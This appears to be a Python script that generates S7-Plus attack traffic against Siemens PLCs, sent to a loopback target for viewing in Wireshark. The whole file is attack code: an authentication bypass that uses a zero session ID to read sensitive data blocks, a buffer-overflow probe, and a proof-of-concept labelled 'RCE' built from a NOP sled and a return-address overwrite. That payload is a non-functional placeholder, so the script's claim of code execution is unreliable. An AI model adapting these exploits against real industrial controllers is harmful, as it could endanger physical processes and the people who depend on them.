from s7plus_base import *

DEST_IP = TARGET_LOOPBACK

# 漏洞1扫描：空会话ID鉴权绕过探测
def scan_auth_bypass_vuln():
    param = struct.pack(">BBHHHB", 0x04, 0x01, 0x84, 1, 0, 16)
    # 原生漏洞：会话ID置0，绕过PLC鉴权校验
    pdu = build_s7_pdu(JOB_REQ, seq=0x0003, sess_id=0x00000000, param_buf=param, data_buf=b"")
    full_pkt = wrap_tpkt_cotp(pdu)
    send_s7_standard_pkt(DEST_IP, sport=51236, full_payload=full_pkt)
    S7Log.warn("发送鉴权绕过探测包：空会话ID尝试无权限访问DB块（S7原生协议漏洞）")

# 漏洞2扫描：缓冲区溢出探测（合法参数+超长畸形数据段）
def scan_buffer_overflow_vuln():
    param = struct.pack(">BBHHHB", 0x04, 0x01, 0x84, 2, 0, 16)
    # 原生内存漏洞：PDU头长度合法，实际载荷超长，拷贝溢出缓冲区
    overflow_payload = b"A" * 4096
    pdu = build_s7_pdu(JOB_REQ, seq=0x0004, sess_id=VALID_SESS_ID, param_buf=param, data_buf=overflow_payload)
    full_pkt = wrap_tpkt_cotp(pdu)
    send_s7_standard_pkt(DEST_IP, sport=51237, full_payload=full_pkt)
    S7Log.warn("发送缓冲区溢出探测包：超长数据段载荷，触发PLC内存破坏风险（二进制协议原生漏洞）")

# POC1：鉴权绕过完整利用（读取系统敏感DB）
def poc_auth_bypass_leak():
    leak_param = struct.pack(">BBHHHB", 0x04, 0x01, 0x84, 0, 0, 128)
    pdu = build_s7_pdu(JOB_REQ, seq=0x0005, sess_id=0x00000000, param_buf=leak_param, data_buf=b"")
    full_pkt = wrap_tpkt_cotp(pdu)
    send_s7_standard_pkt(DEST_IP, sport=51238, full_payload=full_pkt)
    S7Log.exploit("鉴权绕过POC执行：无会话ID读取PLC系统配置、工艺敏感数据")

# POC2：缓冲区溢出RCE攻击载荷
def poc_overflow_rce():
    exp_param = struct.pack(">BBHHHB", 0x05, 0x01, 0x84, 3, 0, 64)
    # 攻击载荷：NOP雪橇+覆盖返回地址
    shellcode = b"\x90" * 128 + b"\xff\xff\xff\xff\xdeadbeef"
    pdu = build_s7_pdu(JOB_REQ, seq=0x0006, sess_id=VALID_SESS_ID, param_buf=exp_param, data_buf=shellcode)
    full_pkt = wrap_tpkt_cotp(pdu)
    send_s7_standard_pkt(DEST_IP, sport=51239, full_payload=full_pkt)
    S7Log.exploit("缓冲区溢出RCE攻击POC发送，可实现远程代码执行/拒绝服务")

if __name__ == "__main__":
    print("===== S7-Plus 原生漏洞扫描 + POC攻击流量生成 =====")
    # 漏洞探测扫描包
    scan_auth_bypass_vuln()
    scan_buffer_overflow_vuln()
    # 漏洞利用POC攻击流量
    poc_auth_bypass_leak()
    poc_overflow_rce()
    print("===== 漏洞流量发送完毕，Wireshark【本地连接*8】过滤 tcp.port == 102 查看标准攻击报文 =====\n")